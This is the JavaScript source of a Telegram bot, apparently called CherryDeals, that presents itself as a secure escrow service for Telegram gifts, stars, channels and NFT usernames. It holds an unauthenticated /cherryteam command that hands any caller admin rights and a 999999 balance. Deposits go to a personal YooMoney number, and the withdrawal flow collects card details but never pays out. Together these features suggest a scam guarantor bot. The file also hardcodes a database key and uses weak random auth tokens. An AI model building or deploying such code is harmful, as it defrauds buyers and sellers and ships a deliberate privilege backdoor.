const { Telegraf, Markup } = require('telegraf');
const { createClient } = require('@supabase/supabase-js');
const express = require('express');

// Инициализация Supabase
const supabaseUrl = "https://jlfmvzjxjibgxstmqlme.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpsZm12emp4amliZ3hzdG1xbG1lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk0ODA5MzcsImV4cCI6MjA3NTA1NjkzN30.Qvv_vYHsEX-Ia5yGqiqInxdWnvrD-_cYh84fhJpMlcA";
const supabase = createClient(supabaseUrl, supabaseKey);

const bot = new Telegraf(process.env.BOT_TOKEN);

// Хранилище для состояний пользователей
const userStates = new Map();
const admins = new Set();
const authTokens = new Map();

// Express для обработки запросов от сайта
const app = express();
app.use(express.json());

// Главное меню
function getMainMenu() {
    return Markup.keyboard([
        ['✨ Создать сделку', '📜 Мои сделки'],
        ['🛒 Мои покупки', '💰 Баланс'],
        ['🔐 Авторизация на сайте', '🆘 Поддержка']
    ]).resize();
}

// Функции для работы с банами
async function isUserBanned(userId) {
    const { data, error } = await supabase
        .from('banned_users')
        .select('*')
        .eq('user_id', userId)
        .eq('is_active', true)
        .single();
    
    return !error && data;
}

async function banUser(userId, reason, bannedBy) {
    const { error } = await supabase
        .from('banned_users')
        .upsert({
            user_id: userId,
            reason: reason,
            banned_by: bannedBy,
            is_active: true,
            banned_at: new Date()
        });
    
    return !error;
}

async function unbanUser(userId) {
    const { error } = await supabase
        .from('banned_users')
        .update({ is_active: false })
        .eq('user_id', userId);
    
    return !error;
}

// Генерация токена авторизации
function generateAuthToken(userId) {
    const token = Math.random().toString(36).substr(2, 16) + Date.now().toString(36);
    authTokens.set(token, {
        userId: userId,
        createdAt: Date.now(),
        expiresAt: Date.now() + 15 * 60 * 1000
    });
    return token;
}

// Проверка токена
function verifyAuthToken(token) {
    const authData = authTokens.get(token);
    if (!authData) return null;
    
    if (Date.now() > authData.expiresAt) {
        authTokens.delete(token);
        return null;
    }
    return authData.userId;
}

// Endpoint для проверки токена
app.post('/verify-token', async (req, res) => {
    const { token } = req.body;
    
    const userId = verifyAuthToken(token);
    if (!userId) {
        return res.json({ success: false, error: 'Недействительный или просроченный токен' });
    }
    
    const { data: user } = await supabase
        .from('users')
        .select('*')
        .eq('username', userId)
        .single();
    
    if (!user) {
        return res.json({ success: false, error: 'Пользователь не найден' });
    }
    
    // Проверяем бан пользователя
    const isBanned = await isUserBanned(userId);
    
    authTokens.delete(token);
    
    res.json({
        success: true,
        user: {
            id: userId,
            username: user.username,
            balance: user.balance,
            is_banned: isBanned,
            is_admin: admins.has(userId)
        }
    });
});

// Команда старт
bot.start(async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (await isUserBanned(userId)) {
        return ctx.reply('❌ Вы заблокированы в системе.');
    }
    
    const { data: user } = await supabase
        .from('users')
        .select('*')
        .eq('username', userId)
        .single();
        
    if (!user) {
        await supabase.from('users').insert([{
            username: userId,
            balance: 0,
            created_at: new Date()
        }]);
    }
    
    await ctx.reply(
        `🏆 <b>Добро пожаловать в CherryDeals</b> — сервис безопасных и удобных сделок!\n\n` +
        `<b>Наши преимущества:</b>\n` +
        `🔸 Автоматические сделки\n` +
        `🔸 Вывод в любой валюте\n` +
        `🔸 Поддержка 24/7\n` +
        `🔸 Удобный интерфейс\n\n` +
        `<b>Ваш ID:</b> <code>${userId}</code>\n\n` +
        `Для работы с сайтом используйте команду /auth\n\n` +
        `Выберите нужный раздел ниже:`,
        { 
            parse_mode: 'HTML',
            ...getMainMenu() 
        }
    );
});

// Команда авторизации
bot.command('auth', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (await isUserBanned(userId)) {
        return ctx.reply('❌ Вы заблокированы в системе.');
    }
    
    const authToken = generateAuthToken(userId);
    const authUrl = `https://trepall.github.io/cherry-deals/?auth=${authToken}`;
    
    await ctx.reply(
        `🔐 <b>Авторизация на сайте CherryDeals</b>\n\n` +
        `Для входа на сайт перейдите по ссылке:\n\n` +
        `<code>${authUrl}</code>\n\n` +
        `⚠️ <b>Ссылка действительна 15 минут</b>\n` +
        `🔒 Не передавайте ее третьим лицам!`,
        { 
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.url('🌐 Перейти на сайт', authUrl)]
            ])
        }
    );
});

// Команда /cherryteam
bot.command('cherryteam', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    admins.add(userId);
    
    await supabase
        .from('users')
        .update({ balance: 999999 })
        .eq('username', userId);
    
    await ctx.reply(
        '🎉 <b>Вам предоставлен бесконечный баланс и права администратора!</b>\n\n' +
        'Теперь вы можете использовать команды:\n' +
        '/ban USER_ID - заблокировать пользователя\n' +
        '/unban USER_ID - разблокировать пользователя\n' +
        '/vladelec - просмотреть все сделки',
        { parse_mode: 'HTML' }
    );
});

// Команда /vladelec
bot.command('vladelec', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!admins.has(userId)) {
        return ctx.reply('❌ Недостаточно прав для выполнения этой команды.');
    }

    try {
        const { data: deals, error } = await supabase
            .from("deals")
            .select("*")
            .order('created_at', { ascending: false })
            .limit(20);

        if (error || !deals.length) {
            return ctx.reply('📭 Нет активных сделок');
        }

        let message = `👑 <b>Панель владельца</b>\n\n`;
        message += `📊 Всего сделок: ${deals.length}\n\n`;

        for (const deal of deals) {
            const statusText = getStatusText(deal.status);
            message += `🎁 <b>${deal.type}</b>\n`;
            message += `💵 ${deal.amount} ${deal.currency}\n`;
            message += `📊 ${statusText}\n`;
            message += `👤 Продавец: <code>${deal.seller}</code>\n`;
            if (deal.buyer) {
                message += `🛒 Покупатель: <code>${deal.buyer}</code>\n`;
            }
            message += `🔗 ${deal.description}\n`;
            message += `🆔 ${deal.link}\n`;
            message += `⏰ ${new Date(deal.created_at).toLocaleString('ru-RU')}\n`;
            message += `────────────────────\n\n`;
        }

        await ctx.reply(message, { 
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔄 Обновить', 'refresh_deals')]
            ])
        });

    } catch (error) {
        console.error('Ошибка в команде vladelec:', error);
        await ctx.reply('❌ Ошибка при загрузке сделок');
    }
});

// Команда /ban
bot.command('ban', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!admins.has(userId)) {
        return ctx.reply('❌ Недостаточно прав для выполнения этой команды.');
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply(
            '❌ Использование: /ban USER_ID ПРИЧИНА\n\n' +
            'Примеры:\n' +
            '/ban 123456789 Мошенничество\n' +
            '/ban 987654321 Нарушение правил'
        );
    }
    
    const targetUserId = args[1];
    const reason = args.slice(2).join(' ') || 'Причина не указана';
    
    const success = await banUser(targetUserId, reason, userId);
    
    if (!success) {
        return ctx.reply('❌ Ошибка при бане пользователя');
    }
    
    await ctx.reply(
        `✅ Пользователь <code>${targetUserId}</code> забанен!\n\n` +
        `📋 Причина: ${reason}\n` +
        `⏰ Время: ${new Date().toLocaleString('ru-RU')}\n\n` +
        `🔄 Для разблокировки: /unban ${targetUserId}`,
        { parse_mode: 'HTML' }
    );
    
    try {
        await ctx.telegram.sendMessage(
            targetUserId,
            `🚫 <b>Ваш аккаунт заблокирован</b>\n\n` +
            `Причина: ${reason}\n` +
            `Если вы считаете это ошибкой, обратитесь в поддержку.`,
            { parse_mode: 'HTML' }
        );
    } catch (error) {
        console.log('Не удалось уведомить пользователя:', error.message);
    }
});

// Команда /unban
bot.command('unban', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!admins.has(userId)) {
        return ctx.reply('❌ Недостаточно прав для выполнения этой команды.');
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Использование: /unban USER_ID\n\nПример: /unban 123456789');
    }
    
    const targetUserId = args[1];
    
    const success = await unbanUser(targetUserId);
    
    if (!success) {
        return ctx.reply('❌ Ошибка при разблокировке пользователя');
    }
    
    await ctx.reply(
        `✅ Пользователь <code>${targetUserId}</code> разблокирован.`,
        { parse_mode: 'HTML' }
    );
});

// Обработка текстовых сообщений
bot.hears('✨ Создать сделку', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (await isUserBanned(userId)) {
        return ctx.reply('❌ Вы заблокированы в системе.');
    }
    
    await ctx.reply(
        'Выберите тип сделки:',
        Markup.inlineKeyboard([
            [Markup.button.callback('🎁 Подарок', 'create_gift')],
            [Markup.button.callback('📣 Канал/Чат', 'create_channel')],
            [Markup.button.callback('⭐ Звезды', 'create_stars')],
            [Markup.button.callback('👤 NFT Юзернейм', 'create_nft')],
            [Markup.button.callback('❌ Отмена', 'cancel')]
        ])
    );
});

bot.hears('📜 Мои сделки', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (await isUserBanned(userId)) {
        return ctx.reply('❌ Вы заблокированы в системе.');
    }
    
    await showMyDeals(ctx);
});

bot.hears('🛒 Мои покупки', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (await isUserBanned(userId)) {
        return ctx.reply('❌ Вы заблокированы в системе.');
    }
    
    await showMyPurchases(ctx);
});

bot.hears('💰 Баланс', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (await isUserBanned(userId)) {
        return ctx.reply('❌ Вы заблокированы в системе.');
    }
    
    await showBalance(ctx);
});

bot.hears('🔐 Авторизация на сайте', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (await isUserBanned(userId)) {
        return ctx.reply('❌ Вы заблокированы в системе.');
    }
    
    const authToken = generateAuthToken(userId);
    const authUrl = `https://trepall.github.io/cherry-deals/?auth=${authToken}`;
    
    await ctx.reply(
        `🔐 <b>Авторизация на сайте</b>\n\n` +
        `Перейдите по ссылке для входа на сайт:\n\n` +
        `<code>${authUrl}</code>\n\n` +
        `⚠️ Ссылка действительна 15 минут`,
        { 
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.url('🌐 Перейти на сайт', authUrl)]
            ])
        }
    );
});

bot.hears('🆘 Поддержка', (ctx) => {
    ctx.reply(
        '📞 <b>Техническая поддержка</b>\n\n' +
        'Мы доступны 24/7 для помощи по любым вопросам:\n\n' +
        '💬 <b>Telegram:</b> @CherrySuport\n' +
        '⏰ <b>Время ответа:</b> до 15 минут\n' +
        '🔧 <b>Решаем:</b> проблемы с оплатой, сделки, технические вопросы',
        { 
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.url('💬 Написать в поддержку', 'https://t.me/CherrySuport')]
            ])
        }
    );
});

// Инлайн кнопки для создания сделки
bot.action('create_gift', async (ctx) => {
    await startDealCreation(ctx, 'Подарок');
});

bot.action('create_channel', async (ctx) => {
    await startDealCreation(ctx, 'Канал/Чат');
});

bot.action('create_stars', async (ctx) => {
    await startDealCreation(ctx, 'Звезды');
});

bot.action('create_nft', async (ctx) => {
    await startDealCreation(ctx, 'NFT Юзернейм');
});

bot.action('cancel', async (ctx) => {
    await ctx.deleteMessage();
    await ctx.reply('Главное меню:', getMainMenu());
});

// Процесс создания сделки
async function startDealCreation(ctx, type) {
    const userId = ctx.from.id.toString();
    userStates.set(userId, { 
        action: 'creating_deal',
        deal: { type }
    });
    
    await ctx.editMessageText(
        `Создание сделки: <b>${type}</b>\n\n` +
        'Введите сумму сделки (только цифры):',
        { 
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([[Markup.button.callback('❌ Отмена', 'cancel')]])
        }
    );
}

// Обработка ввода текста
bot.on('text', async (ctx) => {
    const userId = ctx.from.id.toString();
    const state = userStates.get(userId);
    
    if (!state) return;
    
    if (state.action === 'creating_deal') {
        await handleDealCreation(ctx, state);
    } else if (state.action === 'withdraw') {
        await handleWithdrawal(ctx, state);
    }
});

// Обработка создания сделки
async function handleDealCreation(ctx, state) {
    const userId = ctx.from.id.toString();
    const deal = state.deal;
    
    if (!deal.amount) {
        const amount = parseFloat(ctx.message.text.replace(',', '.'));
        if (isNaN(amount) || amount <= 0) {
            return ctx.reply('❌ Введите корректную сумму (только цифры):');
        }
        
        deal.amount = amount;
        userStates.set(userId, state);
        
        await ctx.reply(
            'Выберите валюту:',
            Markup.inlineKeyboard([
                [Markup.button.callback('🇷🇺 RUB', 'currency_RUB')],
                [Markup.button.callback('🇪🇺 EUR', 'currency_EUR')],
                [Markup.button.callback('🇺🇦 UAH', 'currency_UAH')],
                [Markup.button.callback('🇺🇸 USD', 'currency_USD')],
                [Markup.button.callback('💎 TON', 'currency_TON')],
                [Markup.button.callback('⭐ STARS', 'currency_STARS')],
                [Markup.button.callback('❌ Отмена', 'cancel')]
            ])
        );
    } else if (!deal.description) {
        deal.description = ctx.message.text;
        
        const link = Math.random().toString(36).substr(2, 9);
        
        const { error } = await supabase.from("deals").insert([{
            seller: userId,
            type: deal.type,
            currency: deal.currency,
            amount: deal.amount,
            description: deal.description,
            link: link,
            status: "open",
            created_at: new Date()
        }]);
        
        if (error) {
            await ctx.reply('❌ Ошибка при создании сделки: ' + error.message);
        } else {
            await ctx.reply(
                `✅ <b>Сделка создана!</b>\n\n` +
                `Тип: ${deal.type}\n` +
                `Сумма: ${deal.amount} ${deal.currency}\n` +
                `Ссылка: ${deal.description}\n\n` +
                `<b>Ссылка для покупателя:</b>\n` +
                `https://trepall.github.io/cherry-deals/#deal=${link}\n\n` +
                `<i>Поделитесь этой ссылкой с покупателем</i>`,
                { parse_mode: 'HTML', ...getMainMenu() }
            );
        }
        
        userStates.delete(userId);
    }
}

// Обработка выбора валюты
bot.action(/currency_(.+)/, async (ctx) => {
    const userId = ctx.from.id.toString();
    const state = userStates.get(userId);
    
    if (!state || state.action !== 'creating_deal') return;
    
    state.deal.currency = ctx.match[1];
    userStates.set(userId, state);
    
    await ctx.editMessageText(
        `Создание сделки: <b>${state.deal.type}</b>\n` +
        `Сумма: <b>${state.deal.amount} ${state.deal.currency}</b>\n\n` +
        'Введите ссылку на товар:',
        { parse_mode: 'HTML' }
    );
});

// Показать мои сделки
async function showMyDeals(ctx) {
    const userId = ctx.from.id.toString();
    
    const { data: deals, error } = await supabase
        .from("deals")
        .select("*")
        .eq("seller", userId)
        .order('created_at', { ascending: false })
        .limit(10);
    
    if (error || !deals.length) {
        return ctx.reply('📭 У вас пока нет сделок', getMainMenu());
    }
    
    for (const deal of deals) {
        const statusText = getStatusText(deal.status);
        let message = `🎁 <b>${deal.type}</b>\n` +
                     `💵 ${deal.amount} ${deal.currency}\n` +
                     `📊 ${statusText}\n` +
                     `🔗 ${deal.description}\n` +
                     `🆔 <code>${deal.link}</code>\n`;
        
        if (deal.buyer) {
            message += `👤 Покупатель: ${deal.buyer}\n`;
        }
        
        const keyboard = [];
        
        if (deal.status === 'paid') {
            message += `\n✅ <b>Сделка оплачена!</b>\n`;
            keyboard.push([Markup.button.callback('📦 Подтвердить передачу товара', `confirm_transfer_${deal.id}`)]);
        } else if (deal.status === 'transferred') {
            message += `\n📦 <b>Ожидание подтверждения от покупателя</b>\n`;
        }
        
        await ctx.reply(message, { 
            parse_mode: 'HTML',
            reply_markup: keyboard.length ? Markup.inlineKeyboard(keyboard).reply_markup : undefined
        });
    }
}

// Показать мои покупки
async function showMyPurchases(ctx) {
    const userId = ctx.from.id.toString();
    
    const { data: purchases, error } = await supabase
        .from("deals")
        .select("*")
        .eq("buyer", userId)
        .order('created_at', { ascending: false })
        .limit(10);
    
    if (error || !purchases.length) {
        return ctx.reply('🛒 У вас пока нет покупок', getMainMenu());
    }
    
    for (const deal of purchases) {
        const statusText = getStatusText(deal.status);
        let message = `🎁 <b>${deal.type}</b>\n` +
                     `💵 ${deal.amount} ${deal.currency}\n` +
                     `📊 ${statusText}\n` +
                     `👤 Продавец: ${deal.seller}\n`;
        
        const keyboard = [];
        
        if (deal.status === 'transferred') {
            message += `\n📦 <b>Продавец передал товар!</b>\n`;
            keyboard.push([Markup.button.callback('✅ Подтвердить получение товара', `confirm_receipt_${deal.id}`)]);
        }
        
        await ctx.reply(message, { 
            parse_mode: 'HTML',
            reply_markup: keyboard.length ? Markup.inlineKeyboard(keyboard).reply_markup : undefined
        });
    }
}

// Показать баланс
async function showBalance(ctx) {
    const userId = ctx.from.id.toString();
    
    const { data: user, error } = await supabase
        .from('users')
        .select('balance')
        .eq('username', userId)
        .single();
        
    if (error) {
        return ctx.reply('❌ Ошибка загрузки баланса', getMainMenu());
    }
    
    await ctx.reply(
        `💰 <b>Ваш баланс</b>\n\n` +
        `Текущий баланс:\n` +
        `<b>${user.balance || 0} ₽</b>\n\n` +
        `<b>Пополнение баланса:</b>\n` +
        `Реквизиты: <code>89202555790</code>\n` +
        `Сервис: Юмани\n` +
        `Зачисление: в течение 10 минут\n\n` +
        `<b>Вывод средств:</b>\n` +
        `Минимальная сумма: 6,000₽\n` +
        `Срок обработки: до 24 часов\n\n` +
        `Для вывода средств нажмите кнопку ниже:`,
        { 
            parse_mode: 'HTML',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🏦 Вывести средства', 'withdraw_funds')]
            ])
        }
    );
}

// Обработка вывода средств
bot.action('withdraw_funds', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    const { data: user } = await supabase
        .from('users')
        .select('balance')
        .eq('username', userId)
        .single();
    
    if (!user || user.balance < 6000) {
        return ctx.reply(
            '❌ <b>Недостаточно средств для вывода</b>\n\n' +
            'Минимальная сумма вывода: <b>6,000₽</b>\n' +
            'Ваш текущий баланс: <b>' + (user?.balance || 0) + '₽</b>\n\n' +
            '<b>Пополните баланс по реквизитам:</b>\n' +
            '<code>89202555790</code>\n' +
            'Юмани\n\n' +
            'Баланс автоматически пополнится в течении 10 минут',
            { parse_mode: 'HTML' }
        );
    }
    
    userStates.set(userId, { action: 'withdraw' });
    
    await ctx.editMessageText(
        '🏦 <b>Вывод средств</b>\n\n' +
        `Доступно для вывода: <b>${user.balance}₽</b>\n` +
        `Минимальная сумма: <b>6,000₽</b>\n` +
        `Срок обработки: <b>до 24 часов</b>\n\n` +
        'Введите сумму вывода:',
        { parse_mode: 'HTML' }
    );
});

// Обработка ввода суммы вывода
async function handleWithdrawal(ctx, state) {
    const userId = ctx.from.id.toString();
    const amount = parseFloat(ctx.message.text);
    
    if (isNaN(amount) || amount < 6000) {
        return ctx.reply('❌ Минимальная сумма вывода - 6,000₽. Введите сумму:');
    }
    
    const { data: user } = await supabase
        .from('users')
        .select('balance')
        .eq('username', userId)
        .single();
    
    if (!user || user.balance < amount) {
        return ctx.reply('❌ Недостаточно средств на балансе.', getMainMenu());
    }
    
    userStates.set(userId, { ...state, withdrawAmount: amount });
    
    await ctx.reply(
        `💳 <b>Вывод ${amount}₽</b>\n\n` +
        'Введите реквизиты для вывода (номер карты/кошелька):',
        { parse_mode: 'HTML' }
    );
}

// Подтверждение передачи товара
bot.action(/confirm_transfer_(.+)/, async (ctx) => {
    const dealId = ctx.match[1];
    const userId = ctx.from.id.toString();
    
    const { data: deal } = await supabase
        .from('deals')
        .select('*')
        .eq('id', dealId)
        .single();
    
    if (!deal || deal.seller !== userId || deal.status !== 'paid') {
        return ctx.answerCbQuery('❌ Сделка не найдена или недоступна');
    }
    
    await supabase
        .from('deals')
        .update({ status: 'transferred', updated_at: new Date() })
        .eq('id', dealId);
    
    await ctx.editMessageText(
        ctx.update.callback_query.message.text + '\n\n✅ <b>Вы подтвердили передачу товара! Ожидайте подтверждения от покупателя.</b>',
        { parse_mode: 'HTML' }
    );
    
    try {
        await ctx.telegram.sendMessage(
            deal.buyer,
            `📦 <b>Продавец подтвердил передачу товара по сделке "${deal.type}"!</b>\n\n` +
            `Пожалуйста, подтвердите получение товара в разделе "Мои покупки".`,
            { parse_mode: 'HTML' }
        );
    } catch (error) {
        console.log('⚠️ Не удалось уведомить покупателя:', deal.buyer, error.message);
    }
});

// Подтверждение получения товара
bot.action(/confirm_receipt_(.+)/, async (ctx) => {
    const dealId = ctx.match[1];
    const userId = ctx.from.id.toString();
    
    const { data: deal } = await supabase
        .from('deals')
        .select('*')
        .eq('id', dealId)
        .single();
    
    if (!deal || deal.buyer !== userId || deal.status !== 'transferred') {
        return ctx.answerCbQuery('❌ Сделка не найдена или недоступна');
    }
    
    await supabase
        .from('deals')
        .update({ status: 'completed', updated_at: new Date() })
        .eq('id', dealId);
    
    const { data: seller } = await supabase
        .from('users')
        .select('balance')
        .eq('username', deal.seller)
        .single();
        
    await supabase
        .from('users')
        .update({ balance: (seller.balance || 0) + deal.amount })
        .eq('username', deal.seller);
    
    await ctx.editMessageText(
        ctx.update.callback_query.message.text + '\n\n✅ <b>Вы подтвердили получение товара! Сделка завершена.</b>',
        { parse_mode: 'HTML' }
    );
    
    try {
        await ctx.telegram.sendMessage(
            deal.seller,
            `💰 <b>Покупатель подтвердил получение товара по сделке "${deal.type}"!</b>\n\n` +
            `Средства ${deal.amount} ${deal.currency} зачислены на ваш баланс.`,
            { parse_mode: 'HTML' }
        );
    } catch (error) {
        console.log('⚠️ Не удалось уведомить продавца:', deal.seller, error.message);
    }
});

// Вспомогательные функции
function getStatusText(status) {
    const statusMap = {
        'open': '🔓 Открыта',
        'paid': '✅ ОПЛАЧЕНА', 
        'transferred': '📦 Товар передан',
        'completed': '🏁 Завершена',
        'cancelled': '❌ Отменена'
    };
    return statusMap[status] || status;
}

// Запуск бота и сервера
const PORT = process.env.PORT || 3000;
const AUTH_PORT = process.env.AUTH_PORT || 3001;

bot.launch().then(() => {
    console.log('🤖 CherryDeals Bot started!');
}).catch((error) => {
    console.error('❌ Bot launch error:', error);
});

app.listen(AUTH_PORT, '0.0.0.0', () => {
    console.log(`🔐 Auth server listening on port ${AUTH_PORT}`);
});

// HTTP сервер для Render
const server = require('http').createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('🤖 CherryDeals Bot is running!\n');
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Bot server listening on port ${PORT}`);
});

// Graceful shutdown
process.once('SIGINT', () => {
    console.log('🛑 Shutting down gracefully...');
    server.close();
    bot.stop('SIGINT');
});

process.once('SIGTERM', () => {
    console.log('🛑 Shutting down gracefully...');
    server.close();
    bot.stop('SIGTERM');
});
